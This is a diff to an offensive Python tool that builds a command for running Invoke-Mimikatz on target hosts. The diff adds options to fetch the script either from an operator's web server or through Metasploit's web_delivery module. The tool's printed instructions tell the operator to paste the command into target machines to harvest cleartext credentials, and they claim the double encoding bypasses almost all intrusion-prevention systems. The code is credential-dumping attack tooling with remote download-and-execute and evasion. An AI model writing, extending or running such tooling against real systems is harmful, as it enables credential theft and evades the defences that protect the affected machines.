@@ -135,14 +135,16 @@ def get_networks(gateways_dict):
 
 def main():
     # If script is executed at the CLI
-    usage = '''usage: %(prog)s [-t IP] [-r port] [-p payload.ps1] [-a argument] [-f function] [-i interface]  -q -v -vv -vvv'''
+    usage = '''usage: %(prog)s [-t IP] [-r port] [-p payload.ps1] [-a argument] [-f function] [-c interface] -i -d  -q -v -vv -vvv'''
     parser = argparse.ArgumentParser(usage=usage)
     parser.add_argument("-t", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
-    parser.add_argument("-i", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
+    parser.add_argument("-c", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     parser.add_argument("-r", action="store", dest="src_port", default=None, help="Set the port the Mimikatz server is on, defaults to port 8000")
     parser.add_argument("-p", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
     parser.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
     parser.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
+    parser.add_argument("-i", "--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
+    parser.add_argument("-d", "--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
@@ -153,7 +155,7 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    if (args.payload == None) and (args.targets_file == None):
+    if (args.payload == None):
         parser.print_help()
         sys.exit(1)
 
@@ -165,7 +167,17 @@ def main():
     interface = args.interface         # The interface to grab the IP from
     mim_func = args.mim_func           # The function that is executed
     mim_arg = args.mim_arg             # The argument processed by the function
-    execution = "invoker"
+    invoker = args.invoker             # Holds the results for invoker execution
+    downloader = args.downloader       # Holds the results for exploit/multi/script/web_delivery
+    if invoker:
+        execution = "invoker"
+    elif downloader:
+        execution = "downloader"
+    else:
+        parser.print_help()
+        sys.exit("[!] Please choose to execute either the invoker or the downloader")
+
+
     gateways = get_gateways()
     network_ifaces = get_networks(gateways)
     if src_ip == None:
@@ -174,10 +186,13 @@ def main():
         except Exception as e:
             print("[!] No IP address found on interface eth0")
 
-    instructions = '''
-    [*] Place the PowerShell script ''' + payload + ''' in an empty directory.
-    [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.
-    [*] Or start-up your Metasploit module exploit/multi/script/web_delivery.
+    if "invoker" in execution:
+        supplement = '''    [*] Place the PowerShell script ''' + payload + ''' in an empty directory.
+    [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
+    elif "downloader" in execution:
+        supplement = "    [*] Start-up your Metasploit module exploit/multi/script/web_delivery."
+
+    instructions = supplement + '''
     [*] Then copy and paste the following command into the target boxes command shell.
     [*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
     [*] This double encoded script should bypass almost all forms of IPS and it drops no payloads
